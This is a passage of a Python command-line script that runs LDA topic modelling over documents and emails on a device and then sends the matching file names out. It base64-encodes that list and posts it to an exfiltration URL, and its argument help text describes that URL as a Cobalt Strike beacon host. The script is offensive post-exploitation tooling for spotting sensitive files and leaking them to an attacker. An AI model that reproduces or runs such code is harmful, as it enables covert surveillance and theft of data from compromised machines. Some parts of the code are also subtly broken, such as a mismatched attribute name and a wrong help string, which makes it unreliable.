    perp_tol=0.1 #only used in batch learning
    
    if args.scan_max_iter:
        iterations=args.scan_maxiter
    else:
        iterations=20
        
    evaluate_every=1
    mean_change_tol=0.001

    # if args.scan_dovis:
    #     pyldavisdocfile="c:\\temp\\"+datetime.datetime.now().strftime("%B %d %Y %Hh%M")+" pyldavisdoc.html"  
    #     pyldavisdoc=True
    # else:
    #     pyldavisdoc=False

    vectorizedtxt = topic_model_picle.vectorizedtxt
    vectorizeddoctxt = topic_model_picle.vectorizeddoctxt
    emailnumtopics = topic_model_picle.emailnumtopics
    doctext_number_topics = topic_model_picle.doctext_number_topics

    vectorizedtxt,vectorizeddoctxt=Topic.countVectorise(min_df=mindf,max_df=maxdf,no_txt_features=numemailfeatures,no_doc_features=numdocfeatures, regex_pattern=Topic.regex_pattern,ngramrange=Topic.ngram_args) 

    LDA, LDADoc=Topic.doLDA(text_vectorized=vectorizedtxt,doc_text_vectorized=vectorizeddoctxt,
                        text_n_components=emailnumtopics,doc_n_components=doctext_number_topics,
                        learning_method="batch",max_iter=iterations,learning_decay=learning_decay,
                        batch_size=batch_size,perp_tol=perp_tol,mean_change_tol=mean_change_tol,evaluate_every=evaluate_every)   
              

    if not(LDADoc==None):                  
        files = set()
        for topic_nr in args.topic_nrs:
            files |= set(Topic.displayEmailsMatchingDocTopic(int(topic_nr)))
        if (not files):
            raw = 'none'
        else:
            raw = None
            for f in files:
                if (raw):
                    raw = '{}\n{}'.format(raw, f)
                else:
                    raw = f
        b = bytes(raw, 'UTF-8')
        b64_str = base64.b64encode(bytes(raw, 'UTF-8'))
        data='beacon_id={beacon_id}&files={b64_str}'.format(beacon_id=args.beacon_id,b64_str=b64_str.decode())
        requests.post(args.exfil_url, data=data)
    
    
def main():
    parser=argparse.ArgumentParser()
    subparsers = parser.add_subparsers(help='help for subcommand')

    parser_scanlocal = subparsers.add_parser('local',help='Do topic modelling against local files on device')
    parser_scanlocal.add_argument('-d',type=str,nargs='+',dest='dir_to_scan',help='Directories to scan for *.doc(x) & *.pdf files')
    parser_scanlocal.add_argument('-w',type=str,dest='scan_what',help='Scan what -w W|P|B i.e. Word or PDF or Both')
    parser_scanlocal.add_argument('-l',type=str,dest='scan_lemmaargs',help='-l [\'NOUN\',\'ADJ\',\'VERB\',\'ADV\'] Optional Lemma arguments for lemmatisation')
    parser_scanlocal.add_argument('-n',type=str,dest='scan_ngram_args',help='-n x,y optional ngrams from x to y default 1,1')
    parser_scanlocal.add_argument('-i',type=int,dest='scan_max_iter',help='Optional maximum number of iterations for batch mode during LDA eval')
    parser_scanlocal.add_argument('-r',type=str,dest='scan_regex_pattern',help='Optional regular expression pattern for words default is [a-zA-Z0-9]{3,}')
    parser_scanlocal.add_argument('-t',type=int,dest='scan_number_topics',help='Option number of topics default is -t 10')
    parser_scanlocal.add_argument('-s',action='store_true',dest='scan_stop_words',help='optional -f <stopwordsfile> : text file containing comma delimited list of stopwords')
    parser_scanlocal.add_argument('-v',action='store_true',dest='scan_dovis',help="create visualisation file")
    parser_scanlocal.add_argument('-b',type=str,dest='beacon_id',help='The Cobalt Strike beacon ID to encode in the message.')
    parser_scanlocal.add_argument('-e',type=str,dest='exfil_url',help='The URL of the Cobalt Strike beacon host. The collected Topic Models will be sent here.')
    parser_scanlocal.set_defaults(func=handler_scan_local)


    parser_scanlocal = subparsers.add_parser('load',help='Do topic modelling against local files on device')
    parser_scanlocal.add_argument('-p',type=str,dest='pickle_load_file_name',help='Directory to scan for *.doc(x) & *.pdf files')
    parser_scanlocal.add_argument('-v',action='store_true',dest='scan_dovis',help="create visualisation file")
    parser_scanlocal.add_argument('-r',type=str,dest='scan_regex_pattern',help='Optional regular expression pattern for words default is [a-zA-Z0-9]{3,}')
    parser_scanlocal.add_argument('-i',type=int,dest='scan_max_iter',help='Optional maximum number of iterations for batch mode during LDA eval')
    parser_scanlocal.add_argument('-b',type=str,dest='beacon_id',help='The Cobalt Strike beacon ID to encode in the message.')
    parser_scanlocal.add_argument('-t',type=int,nargs='+', dest='topic_nrs',help='The Cobalt Strike beacon ID to encode in the message.')
    parser_scanlocal.add_argument('-e',type=str,dest='exfil_url',help='The URL of the Cobalt Strike beacon host. The collected Topic Models will be sent here.')
    parser_scanlocal.set_defaults(func=handle_load_pickle)

    args=parser.parse_args()
    args.func(args)
    
    
    

       
if __name__== "__main__":
    main()